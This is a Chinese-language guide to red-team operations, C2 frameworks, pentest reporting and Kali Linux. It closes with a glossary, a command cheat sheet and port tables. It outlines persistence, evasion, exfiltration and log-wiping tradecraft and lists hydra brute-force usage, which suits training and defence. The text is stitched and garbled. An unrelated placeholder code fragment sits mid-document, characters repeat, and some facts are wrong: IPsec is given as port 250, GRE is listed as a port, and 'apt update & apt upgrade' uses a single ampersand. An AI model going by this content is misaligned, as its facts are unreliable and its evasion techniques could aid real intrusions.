关键区别：红队模拟攻击是如何发生的。蓝队负责防御。紫队则确保每个人都能从模拟中学习并改进。

## 计划与执行模拟攻击

一次成功的红队行动始于周密的范围划分、明确的目标以及对行动规则（Rules of Engagement）的深刻理解。这些模拟应当反映高级持续性威胁 `APT`、内部威胁和真实世界的对抗行动。

### 红队行动的阶段

1. 计划与侦察

   - 理解目标环境。

   - 执行被动侦察（WHOIS、LinkedIn、子域名、泄露的凭据）。

   - 定义目标和成功标准。

   - 获取书面授权并定义行动规则 `RoE`。

2. 初始访问

   - 通过以下方式获取 foothold：

     - 鱼叉式钓鱼

     - 水坑攻击

     - USB 优盘投放

     - 凭据撞库

3. 建立持久化

   - 设置计划任务、注册表项或 WMI 事件消费者。

   - 部署命令与控制植入。

4. 权限提升

   - 利用弱弱的服务配置、令牌仿充、内核漏洞。

   - 倾储凭据并提取密码哈希值。

5. 横向移动

   - 使用 `SMB`、`PsExec`、`WMI`、`RDP` 和自定义脚本在系统间移动。

   - 在内部移动时保持行动安全 `OPSEC`。

6. 达成目标

   - 窃取敏感数据、外泄文件、访问核心资产（例如域控制器）。

   - 避免触发检测机制。

7. 掩迹

   - 清除日志、删除脚本、修改时间戳。

   - 使用反取证技术。

### 红队中的行动安全 `OPSEC`

行动安全至关重要。红队成员必须：

- 避免导致系统崩溃。

- 使用加密通道。

- 轮换基础设施（域前置、代理链）。

- 使用无文件 Payload 和内存注入规避 EDR。

## 命令与控制 `C2` 技术

红队行动的一个关键要素是与受害系统保持通信。命令与控制 `C2` 框架允许攻击者隐蔽地发布命令、传输文件并执行任务。

### C2 通道类型

1. HTTP/HTTPS（基于 Web）

   - 与合法流量混合。

   - 使用域前置和流量混淆。

   - 示例：`Cobalt Strike`, `Covenant`。

2. DNS 隧道

   - 使用 DNS 请求传输数据。

   - 在高监控环境下较慢但更隐蔽。

3. SMB/命名管道

   - Windows 环境下的内部 C2。

   - 无文件且隐蔽的横向移动。

4. ICMP, FTP, SMTP

   - 备用隐蔽通道。

   - 不常见，但可能绕过简单的检测机制。

### 流行的 C2 框架

- `Cobalt Strike`：功能强大，符合 OPSEC 标准，常模拟 APT。

- `Empire`：基于 PowerShell，适用于以 Windows 为中心的环境。

- `Mythic`：现代开源 C2，带有 UI，支持多个 Agent。

- `Sliver`：开源对手模拟工具，跨平台。

- `Metasploit`：通过 `Meterpreter` 提供基础 C2，可扩展。

C2 战术：使用抖动 `jitter`、睡眠定时器和加密通道。使用 VPS、重定向器和 C2 阶段服务器轮换基础设施。

## 报告与简报

在模拟攻击之后，最重要的交付物是一份清晰、简洁且具有可操作性的报告。目标不是羞辱蓝队，而是提升组织的防御成熟度。

### 红队报告结构

1. 执行摘要

   - 行动的高级概述。

   - 风险评分、关键发现和业务影响。

2. 攻击路径叙述

   - 模拟攻击的逐步说明。

   - 可视化攻击图和截图。

3. 发现与证据

   - 带有证明的漏洞漏洞。

   - 系统配置错误、弱控制措施。

4. 检测与响应评估

   - 检测到了什么、何时以及如何检测。

   - 响应时间和和有效性。

5. 建议

   - 具体、优先排序的修复步骤。

   - 深度防御策略和工具改进。

6. 附录

   - IOCs（入侵指标）

   - Payload 哈希值

   - C2 基础设施详情（如适用）

### 简报流程

- 紫队工作坊：红蓝队利用 `MITRE ATT&CK` 分析行动。

- 经验教训：分享哪些方法有效，哪些失败了，以及如何改进。

- 重测计划：安排后续行动以验证修复情况。

提示：专注于促进改进——而非指责。

专业的报告不仅要指出漏洞，还要应对缓解这些漏洞提供具体的、可操作的建议。它应该为组织提供必要的背景信息、优先级和修复步骤，以保护环境并减少攻击面。

## 3. 用于合规与审计的文档

许多组织要求渗透测试和红队模拟以符合行业标准、法规和审计要求（例如 `GDPR`、`HIPAA`、`PCI DSS`）。一份尽的报告可以作为记录证明，说明测试已进行且漏洞已处理，从而确保合规性。

## 4. 风险与影响评估

渗透测试报告不应仅仅是漏洞列表——它们必须评估每个发现项的风险和影响。如果没有这些，利益相关者可能难以理解漏洞的严重性，并无法有效地优先考虑修复工作。

## 5. 安全态势改进的衡量



对于重复性的测试任务，报告还允许组织衡量其在改进安全态势方面的进展。它可以对比组织安全状况随时间推移的变化，显示之前发现的问题是否已得到解决，并帮助为未来的任务设定基准。

## 报告生成工具

可以使用多种工具和平台在渗透测试和红队模拟任务中自动化、简化或增强报告生成过程。这些工具在收集大量数据或必须快速、高效且一致地生成报告的情况下特别有用。

### 1. Dradis

- 概述：`Dradis`是一种广泛用于安全专业人员的开源协作和报告生成工具。它集成了数据收集、协作和报告功能，使得生成渗透测试报告变得更加容易。
- 特性：自动化报告生成、与常用工具（如`Nmap`、`Nessus`、`Metasploit`）集成、可自定义模板。
- 优势：简化了协作（特别是在大型团队中），并减少了生成报告的人工工作。

### 2. Faraday

- 概述：`Faraday`是一个渗透测试平台，允许对漏洞管理进行实时协作。它还提供了强大的报告功能，可以生成详细的测试报告。
- 特性：实时协作、实时数据处理、可自定义报告模板。
- 优势：非常适合基于团队的测试任务，特别是大规模评估。

### 3. Metasploit Pro

- 概述：`Metasploit Pro`是一款商业渗透测试工具，提供了一系列自动化功能，包括报告生成能力。
- 特性：自动化利用、可自定义报告、与`Nexpose`等漏洞扫描器集成。
- 优势：对于使用`Metasploit`进行利用和报告的团队非常方便。

### 4. Nessus

- 概述：`Nessus`是最常用的漏洞扫描器之一。它提供详细的漏洞报告，并帮助识别从低风险漏洞到高影响的各种问题。
- 特性：自动化漏洞扫描、详细的风险报告、易于使用。
- 优势：快速漏洞扫描和风险评估的理想选择。

### 5. Burp Suite

- 概述：`Burp Suite`是一种流行的Web应用安全测试工具，除了测试功能外，还提供了多种生成漏洞报告的。
- 特性：高级Web应用扫描、详细的漏洞报告、自定义模板。
- 优势：适用于Web应用安全评估和生成详细的Web特定漏洞报告。

## 模板与真实案例

为了确保一致性和专业性，许多渗透测试和红队依赖`报告模板`。模板有助于标准化报告的格式、结构和内容，使其更容易生成，并让利益相关者的遵循更加可靠。

### 报告模板结构

一份组织良好的渗透测试或红队报告通常遵循以下结构：

#### 1. 封面

## 报告标题

- 客户名称及联系信息
- 任务日期
- 作者姓名及联系信息

#### 2. 执行摘要

- 任务的高级概述，包括关键发现、风险评级和业务影响
- 针对非技术决策者
- 应保持简洁但要足够详尽，以让利益相关者理解测试结果。

#### 3. 方法论

- 详细描述任务中使用的测试方法论（例如`OWASP Top 10`、`MITRE ATT&CK`）。
- 应该解释测试每个阶段采取的方法（范围界定、侦察、利用、后渗透利用、报告）。

#### 4. 详细发现

- 对识别出的漏洞进行分类说明，包含详细的技术信息、证据（例如截图、日志）和风险评估。
- 每个发现项应包含：
  - `漏洞描述`：发现了什么？
  - `风险评级`：低、中、高（或其他分类系统）。
  - `影响`：如果被利用可能会产生什么后果？
  - `证据`：漏洞或利用的证明。

#### 5. 修复建议

- 修复每个漏洞的可操作步骤。建议应当清晰并根据组织的背景定制。
- 提供足够的信息，让技术人员理解问题的严重性以及如何处理它。

#### 6. 结论

- 任务总结以及任何留待解决的问题。
- 可以包括进一步的测试建议或后续任务计划。

#### 7. 附录

- 任务期间使用的工具列表。
- 漏洞细节（例如`CVE`、利用引用）。
- 截图、日志或任何其他补充材料。

### 真实案例

许多渗透测试人员会在网上分享匿名化的报告，作为高质量文档的示例。某些平台甚至提供公开的模板，例如`OWASP`测试指南（Testing Guide），它包含了用于Web应用测试的结构化报告格式。此外，红队测试人员经常分享他们的最终任务报告，为与非技术利益相关者沟通的有效方法提供见解和示例。

# 风险与影响的沟通

最终目标是让组织理解哪些漏洞对其资产构成了最大威胁，哪些需要立即修复。报告中最重要的方面之一是向非技术利益相关者有效传达漏洞的风险和影响。

## 风险评估

风险可以分为两个主要部分：可能影响。

1. 可能性：漏洞被利用的概率有多大？
   - 可能性可以根据以下因素评估：
     - 公开利用程序（例如`CVE`详情）。
     - 利用的复杂度。
     - 攻击面暴露程度。
     - 可用的保护措施（例如补丁、安全配置）。

2. `影响`：如果被利用，可能的后果是什么？
   - 影响应从以下方面评估：
     - `机密性`：数据是否会被泄露或盗取？
     - `完整性`：数据是否会被篡改或损坏？
     - `可用性`：系统是否会被崩溃或中断？
     - `声誉`：可能会损害组织的声誉或导致法律后果？

## 风险评级与优先级

为了帮助利益相关者理解每个漏洞的严重性，许多渗透测试人员使用`风险评级系统`（例如紧急、高、中、低）。这些评级为修复工作提供了优先级。

例如，像`公共Web服务器上的RCE（远程代码执行）漏洞`这样的问题可能会被分类为`紧急 (Critical)`，而`密码策略配置错误`可能被评为`中 (Medium)`。

# 跟上潮流与提升技能

网络安全领域在不断演变，新的漏洞、利用程序和安全工具以极快的速度出现。作为一名渗透测试员、红队人员或网络安全专业人士，及时关注最新进展、工具和技术至关重要。本章将探索如何保持技能敏锐、掌握网络安全当前趋势，并提升你的专业知识。

## Kali Linux 滚动发布与更新

`Kali Linux`作为一种专为渗透测试和网络安全专业人士设计的专用操作系统，处于持续的开发和完善之中。保持`Kali Linux`的更新对于确保你在渗透测试中使用最新、最有效的工具和技术至关重要。

### 1. Kali Linux 滚动发布模型

`Kali Linux`采用滚动发布模型运行，这意味着一旦你安装了`Kali`，就不需要等待操作系统的主要版本即可获得最新的工具、补丁和更新。相反，更新会持续推送到系统，使用户只需付出少量精力即可保持最新。

- 滚动发布的优势：
  - 立即获取最新的安全工具和功能。
  - 对现有工具进行持续的漏洞修复和补丁。
  - 支持随之出现的最新硬件和设备。

### 如何跟上更新：

- 定期系统更新：可以使用`Kali`的包管理器`apt`定期更新所有安装的包。你可以运行`sudo apt update & sudo apt upgrade`来确保系统处于最新状态。
- `Kali`存储库：确保你的系统连接到官方`Kali`存储库以访问最新更新。这些存储库由`Kali`团队维护，包含了渗透测试工具和实用程序的更新版本。
- `Kali-Tools GitHub`：`Kali Linux`维护着一个`GitHub`仓库，可以在那里访问工具的最新更新。跟踪此仓库可以帮助你了解添加到`Kali`中的新工具和功能。

### 2. 跟踪工具变化和新功能

由于`Kali Linux`包含了数百种用于渗透测试、安全审计和道德黑客攻击的工具，关注这些工具的变化非常重要。`Kali Linux`经常更新或添加新工具，这可能会显著影响你的测试过程。

- 特定工具的更新：`Kali Linux`中的`Metasploit`、`Nmap`、`Burp Suite`等工具频繁更新。定期检查它们的变更日志（`Changelogs`）可以让你了解新的利用程序、功能或关键的漏洞修复。
- `Kali Linux`博客和邮件列表：`Kali`的博客和邮件列表是获取最新更新、功能和变化的极佳资源。它们通常提供有关如何使用新工具和功能的详细说明。

# 关注安全源和漏洞数据库

为了在不断出现的威胁和漏洞面前保持领先，监控各种`安全源`、`漏洞数据库`和`新闻来源`至关重要。这不仅有助于你识别最新的漏洞，还能增强你对攻击者如何利用这些漏洞以及如何防御它们的理解。

### 1. 漏洞数据库

漏洞数据库跟踪并分类了跨越各种软件、硬件和系统的安全漏洞。对于需要在评估期间识别已知漏洞的渗透测试员来说，这些数据库是无价之。

- `常见漏洞与披露 (CVE)`：`CVE`是最受认可的漏洞数据库之一，为每个已知漏洞提供唯一标识符。定期监控`CVE`可以帮助你在漏洞被发现和修补时了解它们。
- `利用程序数据库 (Exploit Database)`：由`Offensive Security`维护的`Exploit Database`是一个公共利用程序集合。它为渗透测试员提供了有关利用程序的全面信息源，对于评估漏洞非常有价值。
- `国家漏洞数据库 (NVD)`：`NVD`是一个由美国政府资助的数据库，通过提供更详细的元数据（如漏洞严重性评分和影响评估）来补充`CVE`。

### 2. 安全源和新闻来源

关注实时安全源和新闻来源对于感知最新威胁和零日漏洞至关重要。

- 安全邮件列表和警报：



进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```



ARP（地址解析协议）欺骗是一种用于中间人攻击的技术。它允许攻击者截获、修改或重定向同一网络上设备之间的网络流量。

## 常见问题

### 18 渗透测试报告的作用是什么？
测试报告记录了发现、漏洞、其风险以及修复步骤。它有助于通过解决关键漏洞来提高组织的安全性。

### 19 Kali Linux 可以用于应用程序测试吗？
是的，`Kali Linux`包含了`Burp Suite`、`Nikto`和`OWASP ZAP`等强大工具用于 Web 应用程序测试。这些工具有助于发现 Web 应用中的 SQL 注入、XSS 和 CSRF 等漏洞。

### 20 什么是社会工程学？它是如何测试的？
社会工程学涉及操纵人员泄露机密。可以通过模拟钓鱼邮件、预测试或诱饵，使用`Social-Engineer Toolkit (SET)`等工具进行测试。

### 21 后渗透在渗透测试中的重要性是什么？
后渗透很重要，因为它涉及维持访问、提升权限、在网络中横向移动和外泄数据。它模拟了攻击者在初始之后会做的事情。

### 22 常见的密码破解方法有哪些？
常见的方法包括暴力破解、字典攻击和彩虹表攻击。`Hashcat`和`John the Ripper`被广泛用于密码破解。

### 23 文档的重要性是什么？
良好的文档记录了测试过程、发现和建议的缓解措施。它作为证据，并让渗透测试的客户了解漏洞的严重性和风险。

### 24 Kali Linux 可以执行红队行动吗？
是的，`Kali Linux`广泛用于红队对抗，模拟真实世界的网络攻击，包括钓鱼、利用和规避检测等策略。红队模拟攻击者的攻击方法。

### 25 渗透测试认证有哪些？
流行的认证包括`OSCP` (Offensive Security Certified Professional)、`CEH` (Certified Ethical Hacker)和`CompTIA Pentest+`。这些认证验证了渗透测试人员的技能和知识。

# 术语表

| 术语 | 定义 |
| --- | --- |
| AET (高级利用技术) | 一组复杂的利用技术，用于绕过安全控制并获取目标系统的访问权限。 |
| ARP (地址解析协议) | 一种用于将 IP 地址映射到 MAC 地址的协议，用于本地网络通信。 |
| AV (杀毒软件) | 设计用于检测、防止和移除计算机系统中的恶意软件、病毒和其他恶意程序的软件。 |
| Backdoor (后门) | 访问系统或网络的隐藏方法，通常被攻击者用于在不被发现的情况下维持对系统的访问。 |
| Buffer Overflow (缓冲区溢出) | 当数据超过内存中分配的缓冲区大时发生的漏洞，可能允许攻击者执行任意代码。 |
| C2 (命令与控制) | 攻击者用于控制受控系统（通常是僵尸网络或受感染的主机）的通信通道类型。 |
| CVE (常见漏洞披露) | 公开披露的网络安全漏洞或暴露，每个漏洞都有一个唯一的 CVE 编号。 |

## CWE (常见弱枚举)
一个按类型和严重程度组织的软件弱点或漏洞列表。

## 拒绝服务 (DoS)
一种试图通过流量淹没服务或利用漏洞导致系统崩溃来使服务不可用的攻击。

## DNS 欺骗
一种攻击类型，通过操纵 DNS 响应将用户重定向到恶意网站。

## 数据外泄 (Exfiltration)
将数据从系统或网络未经授权地传输到外部位置，通常是攻击者为了窃取敏感数据。

## 漏洞利用 (Exploit)
攻击者用于利用系统或应用程序中漏洞的代码、软件或技术。

## 漏洞数据库 (Exploit-DB)
一个公开的利用程序、漏洞和相关数据的集合，渗透测试人员和攻击者用于识别漏洞。

## 防火墙 (Firewall)
一种监控和控制入出网络流量的安全系统，通常用于防止对或来自私有网络的未经授权访问。

## 哈希 (Hashing)
将数据转换为固定长度字符串（哈希值）的过程，通常用于数据完整性验证和密码存储。

## 蜜罐 (Honeypot)
设计用于诱引并捕获攻击者的诱饵系统或网络，通常用于研究或监测和分析攻击行为。

## IDS (入侵检测系统)
一种用于检测网络或系统上未经授权访问、攻击或恶意活动的系统。

## IPS (入侵预防系统)
一种用于实时检测和防止攻击或未经授权访问的系统，通常在恶意流量到达目标之前将其拦截。

## JWT (JSON Web Token)
一种紧凑的、URL 安全的令牌格式，用于在双方之间安全地传输信息，通常用于身份验证和授权。

## 键盘记录器 (Keylogger)
用于监控和记录击键的恶意软件或硬件，以窃取密码等敏感信息。

## 横向移动 (Lateral Movement)
在初始系统被破解后，在网络内部移动以发现更多系统、扩大控制并利用额外资源的技术。

## 恶意软件 (Malware)
设计用于破坏、利用或通过其他损害系统或网络的恶意软件。

## 中人攻击 (MitM Attack)
攻击者在双方不知情的情况下，秘密地拦截并可能篡改双方之间通信的攻击。

## Meterpreter
`Metasploit`框架中一种强大的有效负载，允许攻击者与受控系统进行交互并远程执行各种命令。

## NAT (网络地址转换)
一种修改 IP 数据包头部网络地址信息的技术，通常用于路由器以允许多个设备共享单个公网 IP 地址。

## Nmap (网络映射器)
一种用于网络发现、漏洞扫描、端口扫描的开源工具。它被广泛用于映射网络以及识别主机和服务。

## NTP (网络时间协议)
一种用于同步网络时钟以确保计时准确的协议，通常对日志记录和安全至关重要。

## OSCP (攻击性安全认证专家)
授予给完成 Offensive Security 的《Kali 渗透测试》(PWK) 课程并通过 OSCP 考试的专业人员的证书。

## OSINT (开源情报)
从互联网和其他来源收集并分析可用信息以获取情报的过程。

## 钓鱼攻击 (Phishing)
一种社会工程学攻击，通过欺骗性的电子邮件或网站诱导个人泄露密码、财务详情或个人信息等敏感信息。

## 权限提升 (Privilege Escalation)
利用漏洞获取系统更高层级权限的行为，通常是从普通用户移动到管理员或 root 权限。

## 枢纽 (Pivoting)
利用受控系统作为跳板攻击网络内其他系统的技术，从而实现横向移动。

## 端口扫描 (Port Scanning)
扫描网络以识别远程系统上开放端口的过程，这些端口可能是被利用的潜在切入点。

## 有效负载 (Payload)
在攻击期间交付的代码或数据，通常用于执行恶意操作或建立远程访问。

## 渗透测试 (Pentesting)
对系统或网络进行模拟攻击，以识别可能被攻击者利用的漏洞。

## 根攻击包 (Rootkit)
一组旨在隐藏恶意活动存在性或维持对系统未经授权访问的工具或软件。

## RAT (远程访问木马)
一种允许攻击者远程控制受控系统的恶意软件，通常用于间谍活动或数据窃取。

## 基于声誉的检测 (Reputation-Based Detection)
一种根据已知声誉（例如来自威胁情报源）识别恶意文件或行为的方法。

## 反向工程 (Reverse Engineering)
解构软件或硬件以理解其功能、识别漏洞或创建利用程序的过程。

## RFI (远程文件包含)
Web 应用程序的一种漏洞，允许攻击者包含远程文件，可能允许执行任意代码。

## SQL 注入 (SQLi)
Web 应用程序的一种漏洞，允许攻击者对数据库执行任意 SQL 查询，通常导致未经授权的数据访问或操纵。

## 社会工程学 (Social Engineering)
攻击者用于操纵个人泄露敏感信息或执行损害安全操作的技术。

## Shell 码 (Shellcode)
在利用程序中用有效负载的小段代码，通常用于执行命令或提供远程访问。

## 嗅探 (Sniffing)
拦截和分析网络流量以收集信息（如密码、凭据或敏感数据）的过程。

## 欺骗 (Spoofing)
冒充另一个系统或用户以获得未经授权的访问或欺骗他人的行为，例如 IP、MAC 或 DNS 欺骗。

## 木马
伪装成合法软件的恶意软件，执行时会有害操作。

## 漏洞扫描
扫描系统和网络以寻找可能被攻击者利用的弱点或安全漏洞的过程。

## 零日漏洞 (Zero-Day Vulnerability)
一种对厂商未知的且无可用修复方案的软件或硬件缺陷，通常在补丁发布前被攻击者利用。

# Kali Linux 命令速查表

| 类别 | 命令 | 描述 |
| --- | --- | --- |
| 文件系统导航 | `pwd` | 输出当前工作目录。 |
| | `ls` | 列出目录内容。 |
| | `ls -l` | 以详细格式列出目录内容，包括文件权限、所有者、大小和修改日期。 |
| | `ls -a` | 列出所有文件，包括隐藏文件（以点开头的文件）。 |
| | `cd <directory>` | 将当前目录切换到 `<directory>`。 |
| | `cd ..` | 返回上一级目录。 |
| | `tree` | 显示目录层次视图。 |
| | `find <directory> -name <filename>` | 根据文件名在目录查找文件。 |



| 文件权限 | `chmod <permissions> <file>` | 更改文件的权限。例如：`chmod 755 file.txt` 赋予完全 |

所有者拥有读/写/执行权限，其他人读/执行权限。

```
chown <user>:<group> <file>
```

更改文件的所有者。

示例：`chown root:file.txt`。

```
chgrp <group> <file>
```

更改文件的组所有者。

# 进程管理

```
ps
```

列出当前运行的进程。

```
ps aux
```

列出所有进程，并包含内存占用、CPU 使用率等详细信息。

```
top
```

显示系统进程、资源使用和性能统计的实时视图。

```
kill <pid>
```

通过进程 ID `PID` 终止进程。

```
killall <process>
```

根据给定的名称终止所有进程。例如：使用 `killall firefox` 关闭所有 Firefox 窗口。

```
bg
```

在后台恢复一个挂起的的进程。

```
fg
```

将后台进程带到前台。

# 网络管理

```
ifconfig
```

显示网络接口配置（在较新的系统中中使用 `ip a`）。

```
ip a
```

显示所有网络接口及其 IP 配置。

```
ping <host>
```

向指定主机发送 ICMP 回显请求以检查其是否可达。

```
traceroute <host>
```

追踪数据包到达指定主机所经过的路由。

```
netstat -tuln
```

显示活动监听端口列表及其关联的服务。

```
nmap <target>
```

用于用于发现主机、服务和开放端口的网络扫描工具。示例：`nmap 192.168.1.1`。

```
netdiscover
```

一种通过 ARP 请求发现网络中主机的工具。

```
iwconfig
```

显示或配置无线网络接口（对于处理无线适配器相关工作非常有用）。

```
airmon-ng
```

启动 `airmon-ng` 工具来管理无线接口上的监听模式 `monitor mode`。

```
aircrack-ng <capture_file>
```

从捕获的数据包中破解 WEP/WPA 密钥。

```
nc <host> <port>
```

Netcat：建立到主机和端口的 TCP/UDP 连接。

```
curl <url>
```

使用 HTTP、HTTPS、FTP 等协议从服务器或向服务器传输数据。适用于测试 Web 服务器。

| 软件包管理 | 描述 |
|---|---|
| `apt update` | 从存储库更新可用软件包及其版本列表。 |
| `apt upgrade` | 将所有已安装软件包升级到最新版本。 |
| `apt install` | 从 Kali 仓库安装新包。示例：`apt install nmap`。 |
| `apt remove <package>` | 移除已安装的包。 |
| `dpkg -l` | 列出系统上安装的包。 |

# 磁盘管理

```
df -h
```

以人类可读的格式显示所有挂载文件系统的磁盘空间占用。

```
du -sh <directory>
```

以人类可读的格式显示目录的磁盘占用情况。

```
mount
```

显示当前挂载的文件系统。

```
umount <device>
```

卸载文件系统或设备。

```
fdisk -l
```

列出所有分区及其相关信息。

# 文本编辑

```
nano <file>
```

在 Nano 编辑器中打开文件进行编辑。

```
vim <file>
```

在 Vim 编辑器中打开文件进行编辑。

```
cat <file>
```

合并并显示文件内容。

```
less <file>
```

一次一页显示文件内容，适用于大文件。

```
grep <pattern> <file>
```

在文件中搜索指定的模式。

```
echo <text>
```

在终端打印指定的文本。

# 脚本编写与自动化

```
bash
```

执行 shell 脚本或启动交互式 Bash Shell 会话。

```
chmod +x <script.sh>
```

使脚本具有可执行权限。

```
./script.sh
```

运行一个可执行的 shell 脚本。

```
cron
```

调度任务在指定时间自动运行。

# 系统信息

```
uname -a
```

显示详细的系统信息，包括内核版本和系统架构。

```
uptime
```

显示系统已运行多长时间，以及系统负载平均值。

```
lscpu
```

显示关于 CPU 架构的详细信息。

```
lsblk
```

列出所有可用的块设备（如硬盘、SSD 等）。

```
free -h
```

以人类可读的格式显示内存使用统计数据。

# 安全工具

```
metasploit
```

启动 Metasploit 框架用于渗透测试和漏洞利用。

```
msfconsole
```

启动 Metasploit 控制台，这是与 Metasploit 交互的主要界面。

```
nikto -h <target>
```

运行 Nikto（Web 服务器扫描器）检查漏洞。

```
burpsuite
```

启动 Burp Suite 代理工具用于 Web 应用测试。

```
hydra -l <username> -P <password_file> <host> <protocol>
```

暴力破解攻击工具，用于对目标服务测试登录凭据。

# 系统安全与取证

```
chkrootkit
```

扫描系统中的 rootkit 迹象。

```
rkhunter
```

扫描 rootkit、后门和本地漏洞。

```
netstat -tulnp
```

显示活动监听端口及其对应的进程。

```
history
```

显示命令历史。

# 归档与压缩

```
tar -czvf <archive.tar.gz> <directory>
```

将目录压缩为 `.tar.gz` 归包。

```
tar -xzvf <archive.tar.gz>
```

解压 `.tar.gz` 归包。

```
zip <archive.zip> <files>
```

将文件压缩为 `.zip` 包。

```
unzip <archive.zip>
```

解压 `.zip` 包。

# 常见端口与协议

| 协议 | 端口 (s) | 服务名称 |
|---|---|---|
| File Transfer | 21 | FTP | 用于文件传输协议。 |
| Secure FTP | 22 | SFTP | 安全文件传输，使用 SSH。 |
| Telnet | 23 | Telnet | 网络通信协议，不加密。 |
| Simple Mail Transfer | 25 | SMTP | 用于邮件服务器之间发送邮件。 |
| Domain Name System | 53 | DNS | 解析域名及反之。 |
| HyperText Transfer | 80 | HTTP | 传输协议。 |
| Post Office Protocol 3 | 110 | POP3 | 邮件客户端从服务器收发电子邮件。 |
| Internet Message Access | 143 | IMAP | 一种同步邮件的协议。 |
| HyperText Transfer Secure | 443 | HTTPS | 使用 SSL/TLS 加密传输。 |
| Server Message Block | 445 | SMB | Windows 网络中的文件和打印机共享。 |
| Remote Desktop Protocol | 3389 | RDP | 用于远程访问 Windows 桌面。 |
| MySQL | 3306 | MySQL | Web 应用中常用的数据库服务。 |
| PostgreSQL | 5432 | PostgreSQL | 开源关系型数据库系统。 |
| Lightweight Directory Access | 389 | LDAP | 访问目录服务的协议。 |
| LDAP over SSL | 636 | LDAPS | 使用 SSL 的 LDAP 版本。 |
| IP Security | 250 | IPsec | 通过认证和加密保护 IP 包（常用于 VPN）。 |
| Generic Routing Encapsulation | 47 | GRE | 用于封装各种网络层协议的隧道协议。 |
| Syslog | 514 | Syslog | 日志标准，常用于路由器、防火墙等网络设备。 |
| Kerberos Authentication | 88 | Kerberos | 使用票据进行安全通信的网络认证协议。 |



# 协议端口列表

| 协议 | 端口 | 名称 | 描述 |
| :--- | :--- | :--- | :--- |
| NetBIOS | 137-139 | NetBIOS | 与局域网 (LAN) 文件和打印机共享相关的网络服务。 |
| Network Time Protocol | 123 | NTP | 在数据交换网络上同步时钟。 |
| Trivial File Transfer | 69 | TFTP | 简化的 FTP 版本，用于网络启动传输小文件。 |
| HTTP Alternate | 8080 | HTTP | Web 服务器用于避免与 80 端口冲突的备用 HTTP 端口。 |
| X11 | 6000 | X Window 系统 | 为 Unix 类系统中的图形用户界面 (GUI) 提供框架。 |
| BGP | 179 | 边界网关协议 | 一种用于互联网自治系统 (AS)之间传输路由信息的路由协议。 |
| MSSQL | 1433 | Microsoft SQL Server | 一种专有的关系数据库管理系统，用于 Web 应用，经常在攻击中被利用。 |
| VNC | 5900 | 虚拟网络计算 | 一种远程桌面共享协议，类似于 RDP，但支持跨平台运行。 |
| L2TP | 1701 | 第二层隧道协议 | 用于 VPN 实现，通常与 IPsec 配合使用。 |
| SIP | 5060 | 会话协议 | 一种用于启动和管理实时通信会（如 VoIP）的协议。 |
| RIP | 520 | 路由信息协议 | 一种距离矢量路由协议，用于确定 IP 网络中数据的最佳路径。 |
| VTP | 1589 | VLAN 组接协议 | 一种 Cisco 专有协议，用于管理跨网络的 VLAN。 |
| FTPS | 990 | 安全 FTP | FTP 的安全版本，使用 SSL/TLS 进行加密连接。 |
| POP3 | 995 | 安全 POP3 | POP3 的安全版本，通常使用 SSL/TLS 进行加密。 |
| IMAPS | 993 | 安全 IMAP | IMAP 的安全版本，使用 SSL/TLS 进行加密检索。 |
| IRC | 6660 | 互联网中继聊天 | 一种用于互联网上实时通信和群聊的协议。 |
| SMTPS | 465 | 安全 SMTP | SMTP 的安全版本，通常使用 SSL/TLS 加密邮件通信。 |
| DCCP | 2080 | 数据报拥塞控制协议 | 一种用于网络通信拥塞控制的传输层协议。 |
| RADIUS | 1812-1813 | 远程认证拨号用户服务 | 用于网络访问认证和计费。 |
| TACACS+ | 49 | 终端访问控制器访问控制系统加 | 一种用于网络设备提供集中认证的协议。 |
| L2F | 1701 | 第二层转发 | 一种用于网络流量隧道协议，常用于 VPN 实现。 |
| FTP over SSL (FTPS) | 989 | FTPS (隐式 SSL FTP) | 使用加密连接的 FTP over SSL。 |
| LDAP (安全) | 636 | 安全 LDAP | 使用 SSL/TLS 加密的 LDAP 协议的安全版本。 |

## 额外注意事项

- **已知端口 (0–1023)**：这些端口被标准服务广泛使用，并需要管理员权限才能绑定。
- **注册端口 (1024–49151)**：这些端口被软件应用程序使用，任何应用程序都可以用于进行通信。
- **动态和私有端口 (49152–65535)**：这些端口供客户端应用程序使用，并进行动态分配。

## 有用资源与进一步阅读

对于任何参与渗透测试、网络安全或仅仅是探索 Kali Linux 及其工具的人来说，都有大量的资源可供基础学习和高级探索。以下是按类型分类的有用资源列表，将帮助加深你在这些领域的知识和技能。

### 1. Kali Linux 官方资源

- **Kali Linux 文档**

Kali Linux 官方网站提供了一套完整的文档，用于入门、高级用法和故障排除。你可以找到关于安装 Kali、配置网络设置以及理解其包含的琳琅不齐的工具set的详细指南。

[Kali Linux 文档](https://www.kali.org/docs/)

- **Kali Linux 博客**

Kali 官方网站上的博客提供了新版本、功能和社区贡献的更新。它是跟进最新进展和 Kali Linux 用户提示的绝佳资源。

[Kali Linux 博客](https://www. kali.org/blog/)

- **Kali Linux GitHub 仓库**

对于对开发感兴趣的人来说，Kali Linux 的官方 GitHub 仓库包含了源代码、社区贡献和发布历史。它也是报告问题或参与 Kali 开发的绝佳场所。

[Kali Linux GitHub](https://github.com/kali-linux/kali-tools)

### 2. 关于渗透测试和 Kali Linux 的书籍

- **Dafydd Stuttard 和 Marcus Pinto 编写的《Web应用程序黑客手册》**

深入探讨 Web 应用安全，涵盖了诸如 SQL 注入、跨站脚本 (XSS) 和跨站请求伪造 (CSRF) 等攻击。对于任何对 Web 应用渗透测试感兴趣的人来说，这本书是必读的。

[Web应用程序手册](url)

- **Raphael Hertzog, Jim O'Gorman 和 Mati Aharoni 编写的《Kali Linux 入门：精通渗透测试发行版》**

一本适合 Kali Linux 初学者和高级用户的优秀书籍。它引导读者完成 Kali 的安装和配置、包含的工具以及如何使用它们进行渗透测试。

[Kali Linux 入门](url)

- **Georgia Weidman 编写的《渗透测试：黑客实战入门》**

对于渗透测试新手来说，这是一份极佳的资源。这本书涵盖了从漏洞利用到后渗透攻击的所有主要概念。

[渗透测试：黑客实战入门](url)

### 3. 在线培训平台

- **Offensive Security Training**

Kali Linux 的创建者 Offensive Security 提供培训和认证。最著名的是 Offensive Security Professional (OSCP)，专注于实战测试。

[Offensive Security Training]

- **TryHackMe**

一个交互式网络安全培训平台，拥有从入门到高级课程，包括渗透测试、Web 应用安全等。

[TryHackMe]
